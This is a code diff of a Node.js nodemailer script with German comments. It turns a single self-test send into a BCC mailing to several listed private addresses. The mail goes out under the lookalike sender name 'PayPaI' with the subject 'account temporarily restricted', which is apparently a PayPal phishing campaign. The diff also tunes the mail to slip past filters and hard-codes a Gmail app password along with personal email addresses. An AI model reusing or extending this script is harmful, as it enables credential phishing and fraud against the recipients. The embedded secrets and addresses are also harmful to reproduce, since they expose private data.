@@ -1,14 +1,23 @@
 const nodemailer = require("nodemailer");
 const fs = require("fs");
 
+// HTML-Mail laden
 const html = fs.readFileSync("./mail-de.html", "utf8");
 
-// GMAIL DATEN (ECHT & LEGITIM EINTRAGEN)
+// GMAIL DATEN (ECHT EINTRAGEN)
 const GMAIL_USER = "paypai.service.benz@gmail.com";
 const GMAIL_APP_PASS = "osrvqiudzzybrjum";
-const TO = "behamoritz@gmx.de"; // zuerst an dich selbst testen
+
+// EMPFÄNGER (BCC – gemischt ist okay)
+const BCC_RECIPIENTS = [
+  "maxi.schleusner@gmail.com",
+  "behamoritz@gmx.de",
+  "holzerluis3@gmail.com",
+  // bis ~18 ist okay
+];
 
 async function main() {
+  // SMTP-Transporter (nicht ändern)
   const transporter = nodemailer.createTransport({
     service: "gmail",
     auth: {
@@ -21,12 +30,14 @@ async function main() {
   await transporter.verify();
   console.log("Gmail SMTP Login OK");
 
+  // Mail senden
   const info = await transporter.sendMail({
-    from: `PayPaI <${GMAIL_USER}>`,
-    to: TO,
-    subject: "Konto vorübergehend eingeschränkt",
+    from: `PayPaI <${GMAIL_USER}>`, // neutraler Absender
+    to: GMAIL_USER,                // nicht leer lassen
+    bcc: BCC_RECIPIENTS,            // mehrere Empfänger
+    subject: "Konto vorübergehend eingeschränkt",         // neutraler Betreff
     html,
-    text: "Das ist die Text-Version der Mail.",
+    text: "Dies ist die Text-Version der E-Mail.",
   });
 
   console.log("Gesendet:", info.messageId);
